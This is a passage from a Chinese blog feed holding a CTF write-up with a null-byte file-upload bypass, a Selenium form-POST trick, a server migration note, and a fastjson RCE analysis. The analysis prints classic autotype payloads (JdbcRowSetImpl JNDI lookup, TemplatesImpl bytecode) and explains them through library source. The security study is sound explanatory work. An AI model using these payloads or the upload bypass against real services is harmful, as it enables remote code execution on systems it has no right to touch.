<h3 id="0x1A-AAENCODE"><a href="#0x1A-AAENCODE" class="headerlink" title="0x1A AAENCODE"></a>0x1A AAENCODE</h3><p>直接丢到 console 运行得到 <code>nctf{javascript_aaencode}</code>, 不得不说这个编码简直神经病 233</p>
<h3 id="0x1C-层层递进"><a href="#0x1C-层层递进" class="headerlink" title="0x1C 层层递进"></a>0x1C 层层递进</h3><p>有毒… 根本没啥思路, 百度了一手发现是在 <code>404.html</code> 里面, 取注释里面 <code>jquery-x</code> 的最后一位拼起来就可以了, 纯脑洞啊…, 拼起来得到 <code>nctf{this_is_a_fl4g}</code></p>
<h3 id="0x1D-上传绕过"><a href="#0x1D-上传绕过" class="headerlink" title="0x1D 上传绕过"></a>0x1D 上传绕过</h3><p>将 /uploads/ 后面添加一个 test.php 再加上个 \x00 就可以了, 代码应该是把 dir + filename 组合后作为保存路径. \x00 截断后, 保存路径就变成了 /uploads/test.php, 成功绕过, 得到 <code>nctf{welcome_to_hacks_world}</code></p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>nctf</tag>
      </tags>
  </entry>
  <entry>
    <title>一个在 selenium webdriver 中 post 数据的小 trick</title>
    <url>/2017/12/16/%E4%B8%80%E4%B8%AA%E5%9C%A8%20selenium%20webdriver%20%E4%B8%AD%20post%20%E6%95%B0%E6%8D%AE%E7%9A%84%E5%B0%8F%20trick/</url>
    <content><![CDATA[<p>在爬英语听力答案中遇到需要 post 数据的需求, 而 webdriver 原生并没有提供 post 数据的功能. 不过想了想, 可以通过 JavaScript 来构造一个虚拟表单然后发送就行了.  语句如下 网上可以找到</p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">js=<span class="string">'''</span></span><br><span class="line"><span class="string">   function post(URL, PARAMS) &#123;        </span></span><br><span class="line"><span class="string">   var temp = document.createElement("form");        </span></span><br><span class="line"><span class="string">   temp.action = URL;        </span></span><br><span class="line"><span class="string">   temp.method = "post";        </span></span><br><span class="line"><span class="string">   temp.style.display = "none";        </span></span><br><span class="line"><span class="string">   for (var x in PARAMS) &#123;        </span></span><br><span class="line"><span class="string">   var opt = document.createElement("textarea");        </span></span><br><span class="line"><span class="string">   opt.name = x;        </span></span><br><span class="line"><span class="string">   opt.value = PARAMS[x];           </span></span><br><span class="line"><span class="string">   temp.appendChild(opt);        </span></span><br><span class="line"><span class="string">   &#125;        </span></span><br><span class="line"><span class="string">   document.body.appendChild(temp);        </span></span><br><span class="line"><span class="string">   temp.submit();        </span></span><br><span class="line"><span class="string">   return temp;        </span></span><br><span class="line"><span class="string">   &#125;            </span></span><br><span class="line"><span class="string">   //调用方法      </span></span><br><span class="line"><span class="string">   post(URL,&#123;'xxx1':'xxx2','xxx3':'xxx4'&#125;);</span></span><br><span class="line"><span class="string">   '''</span></span><br><span class="line">driver.execute_script(js)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>从 CentOS 切换到 Ubuntu</title>
    <url>/2018/10/07/%E4%BB%8E%20CentOS%20%E5%88%87%E6%8D%A2%E5%88%B0%20Ubuntu/</url>
    <content><![CDATA[<p>被 CentOS6 搞的头疼, 各种软件版本都是远古版本, python 甚至还是 3.4, 而自己编译被依赖搞的很烦.<br>所以刚好在国庆几天假期找了个有空的时间重新搭了整个服务器, 投入 Ubuntu 的怀抱.  </p>
<a id="more"></a>

<p>主要是博客上的文章、数据库、gogs (这里给 gogs 点个赞, 备份恢复都很方便) 和部分自己写的东西需要备份, 其他也没啥, 结果不小心就忘了备份图片 =. =,<br>图片全挂了, 也没有再找回来的可能, 就这样吧, 可能有空再把之前手画的图片重新画出来, 不能恢复也就算了吧. 我相信可以自己脑补出来的 www<br>Update: 11.03 基本能恢复的都恢复了 233, 剩下的就当它不存在吧 (逃 顺便, 现在是十月七号晚上. 国庆七天假就这样过去了, 感觉自己有点废柴 233.<br>本来打算把 Java 课设的 GUI 写好的, 结果拖延症一拖就是七天. 虽然不太可能, 还是希望以后能稍微少去把事情拖到最后再去做吧.  </p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson RCE 分析</title>
    <url>/2020/02/01/fastjson-RCE-%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>先看经典 payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>简单来说原因是 fastjson 支持反序列类, 并通过 setter, getter 的方式来为类设置属性, 比如 <code>dataSourceName</code> 就会调用 <code>setDataSourceName(&quot;rmi://localhost:1099/Exploit&quot;)</code>, 而有些类在 setter 之中, 可能有些副作用. 比如这个 payload 中的 <code>com.sun.rowset.JdbcRowSetImpl</code>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> autoCommit)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(autoCommit);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(autoCommit);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource ds = (DataSource)ctx.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? ds.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : ds.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>setAutoCommit</code> 的时候会 <code>ctx.lookup</code>, 之后就是 JNDI 注入了, 先不管这个, 主要还是了解 fastjson 的问题.<br>除了这个 payload 还有一个基于 <code>TemplatesImpl</code> 的 payload, </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQExxxx"</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>这个 payload 相信如果看过 ysoserial 大概都能猜出来, 不过比较不同的他的触发方法比较奇特, 不是通过 setter 来触发, 相信看完下面的内容就能理解了.</p>
<h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>一般用到最多的地方就是 spring 这种 framework, fastjson 提供了对应的接口</p>
<p>com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">readInternal</span><span class="params">(Class&lt;? extends Object&gt; clazz, HttpInputMessage inputMessage)</span> <span class="keyword">throws</span> IOException, HttpMessageNotReadableException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> readType(getType(clazz, <span class="keyword">null</span>), inputMessage);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readType</span><span class="params">(Type type, HttpInputMessage inputMessage)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream in = inputMessage.getBody();</span><br><span class="line">        <span class="keyword">return</span> JSON.parseObject(in, fastJsonConfig.getCharset(), type, fastJsonConfig.getParserConfig(), fastJsonConfig.getParseProcess(), JSON.DEFAULT_PARSER_FEATURE, fastJsonConfig.getFeatures());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (JSONException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpMessageNotReadableException(<span class="string">"JSON parse error: "</span> + ex.getMessage(), ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpMessageNotReadableException(<span class="string">"I/O error while reading input message"</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到调用的就是 <code>JSON.parseObject</code>, 这是用来解析 json objcet 的, 还有个 <code>JSON.parse</code>, 这个可以用来解析 <code>123</code>, <code>&quot;123&quot;</code> 之类的 primitive.  </p>
<p>实际上 <code>JSON.parseObject</code> 有很多重载, 给 spring 写的接口与平常用的并不一样. </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">parseObject</span><span class="params">(InputStream is, Charset charset, Type type, ParserConfig config, ParseProcess processor, <span class="keyword">int</span> featureValues, Feature... features)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (charset == <span class="keyword">null</span>) &#123;</span><br><span class="line">        charset = IOUtils.UTF8;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] bytes = allocateBytes(<span class="number">1024</span> * <span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">int</span> readCount = is.read(bytes, offset, bytes.length - offset);</span><br><span class="line">        <span class="keyword">if</span> (readCount == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        offset += readCount;</span><br><span class="line">        <span class="keyword">if</span> (offset == bytes.length) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] newBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[bytes.length * <span class="number">3</span> / <span class="number">2</span>];</span><br><span class="line">            System.arraycopy(bytes, <span class="number">0</span>, newBytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            bytes = newBytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (T) parseObject(bytes, <span class="number">0</span>, offset, charset, type, config, processor, featureValues, features);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object obj = parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"can not cast to JSONObject."</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>平常用的在内部就是调用的 <code>JSON.parse</code>, 而且后面有个 <code>toJSON</code>, 在这其中会又序列化一遍调用 getter, 如果 getter 里面有问题, 那么也会导致漏洞. 不过一般还是用给 spring 的接口.</p>
<h2 id="autotype"><a href="#autotype" class="headerlink" title="autotype"></a>autotype</h2><p>autotype 就是指这个反序列化 java 类的功能, 也是漏洞的源头. 在新版本里增加了黑名单检测, 所以这里先切到旧版</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">                        ref = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">'"'</span>);</span><br><span class="line">                        Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="keyword">this</span>.config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure>

<p>比较神奇的是它这个 parser, 只要 <code>@type</code> 不是这 object 的最后一个 key, 都是能正常工作的. 如果是最后一个 key, 返回一个调用默认构造器产生对象, 没有设置各种属性.<br>而如果不最后一个, 会调用 castToJavaBean 将之前解析的属性给赋值过去, 然后 deserializer.deserialze 走正常流程.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, <span class="string">'"'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            map.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123; <span class="comment">// 最后一个 key, 当然接下来就是 &#125; 了</span></span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Object instance = <span class="keyword">null</span>;</span><br><span class="line">                ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">                <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                    instance = TypeUtils.cast(object, clazz, <span class="keyword">this</span>.config);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                        instance = <span class="keyword">new</span> HashMap();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"java.util.Collections$EmptyMap"</span>.equals(typeName)) &#123;</span><br><span class="line">                        instance = Collections.emptyMap();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"java.util.Collections$UnmodifiableMap"</span>.equals(typeName)) &#123;</span><br><span class="line">                        instance = Collections.unmodifiableMap(<span class="keyword">new</span> HashMap());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        instance = clazz.newInstance();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> instance;</span><br></pre></td></tr></table></figure>

<p>不过按照设计, <code>@type</code> 肯定是放在最前面的. 这应该算 UB, 不做过多讨论.<br>正常情况应该是 deserializer.deserialze. 对于普通 Bean, 创建 deserialzer 是在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 的 <code>this.createJavaBeanDeserializer</code>, 取得 setter 是在 <code>JavaBeanInfo.build</code>. 判断 setter 的方法如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">"set"</span>)) &#123;</span><br><span class="line">   <span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line">   String propertyName;</span><br><span class="line">   <span class="keyword">if</span> (!Character.isUpperCase(c3) &amp;&amp; c3 &lt;= <span class="number">512</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (c3 == <span class="string">'_'</span>) &#123;</span><br><span class="line">           propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">'f'</span>) &#123;</span><br><span class="line">           propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (methodName.length() &lt; <span class="number">5</span> || !Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">       propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>很明显, 适配了常见的两种命名方式, set_xxx 和 setXxx, 下划线和驼峰, 还有一个 fxxx 命名方式没见过, 可能是阿里内部用的多吧 (逃  </p>
<p>但是除了这种 setter, 实际上还会调用一些 getter, 先看相关代码  </p>
<p>com.alibaba.fastjson.util.JavaBeanInfo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var30 = clazz.getMethods();</span><br><span class="line">var29 = var30.length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; var29; ++i) &#123;</span><br><span class="line">    method = var30[i];</span><br><span class="line">    String methodName = method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">"get"</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">        JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">        <span class="keyword">if</span> (annotation == <span class="keyword">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">            String propertyName;</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="keyword">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                propertyName = annotation.name();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到判断了一下开头为 get, 且第四位为大写, 重点是后面检测了返回值, 必须继承 Map, Collection 或者是 AtomicXxxx. 这些是干嘛的呢?<br>可以看一下具体这些方法会被怎么调用就知道了  </p>
<p>com.alibaba.fastjson.parser.deserializer.FieldDeserializer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object object, Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value != <span class="keyword">null</span> || !<span class="keyword">this</span>.fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = <span class="keyword">this</span>.fieldInfo.method;</span><br><span class="line">            <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123; <span class="comment">// 优先调用 method, 下面是直接复制给 field, 与这里类似, 不复制了</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.getOnly) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                        AtomicInteger atomic = (AtomicInteger)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicInteger)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                        AtomicLong atomic = (AtomicLong)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicLong)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                        AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicBoolean)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                        Map map = (Map)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            map.putAll((Map)value);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        Collection collection = (Collection)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (collection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            collection.addAll((Collection)value);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    method.invoke(object, value);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到是调用了 getter, 然后赋值给这些对象, 相信现在就能明白这些是干嘛的了, 如果有一个对象, 里面有一个属性是 <code>HashMap test</code>, 且有一个 <code>public HashMap getTest()</code> 方法, 那么在反序列化时, <code>{&quot;@type&quot;: &quot;xxx.xxx&quot;, &quot;test&quot;: {&quot;aa&quot;: &quot;sss&quot;}}</code>, key =&gt; aa, value =&gt; sss 将会被加到 test 里面去, 这算一个小 feature 吧, 方便开发. 但是确实有点反直觉.  </p>
<p>这里顺便看一下正规反序列 (toJSON, toJSONString) 时使用的 getter 是怎么判断的, 在 <code>com.alibaba.fastjson.util.TypeUtils</code> 的 <code>buildBeanInfo</code>, 里面调用了 <code>computeGetters</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(methodName.startsWith(<span class="string">"get"</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(methodName.length() &lt; <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(methodName.equals(<span class="string">"getClass"</span>))&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(methodName.equals(<span class="string">"getDeclaringClass"</span>) &amp;&amp; clazz.isEnum())&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line">    String propertyName;</span><br><span class="line">    Field field = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">            || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">            )&#123;</span><br><span class="line">        <span class="keyword">if</span>(compatibleWithJavaBean)&#123;</span><br><span class="line">            propertyName = decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        propertyName = getPropertyNameByCompatibleFieldName(fieldCacheMap, methodName, propertyName, <span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c3 == <span class="string">'_'</span>)&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">        field = fieldCacheMap.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">            String temp = propertyName;</span><br><span class="line">            propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">            field = ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);</span><br><span class="line">            <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = temp; <span class="comment">//减少修改代码带来的影响</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c3 == <span class="string">'f'</span>)&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>)))&#123;</span><br><span class="line">        propertyName = decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">        field = ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);</span><br><span class="line">        <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到规则是跟取 setter 类似的, 就是方法名开头从 set 改成 get.  </p>
<p>总结一下有 <code>@type</code> 的反序列化大致流程  </p>
<ol>
<li>parse 到 key = @type, 将 value 作为 class</li>
<li>反射出类的构造器, 方法, 等</li>
<li>若不是一些内置包装类或者特殊类 + 存在默认构造器, 那么调用 JavaBeanInfo.build 得到 getter, setter, 属性的信息</li>
<li>继续扫描 json, 若有对应的 key 可以找到 setter 或者属性, 就调用 setter 或者直接赋值给属性</li>
</ol>
<p>另外 autotype 是可以嵌套的, 比如可以</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx.xxx"</span>,</span><br><span class="line">        <span class="attr">"xxx"</span>: <span class="string">"xxx"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx.xxx"</span>,</span><br><span class="line">        <span class="attr">"xxx"</span>: &#123;</span><br><span class="line">            <span class="attr">"@type"</span>: <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx"</span></span><br><span class="line">    &#125; : <span class="string">"xx"</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

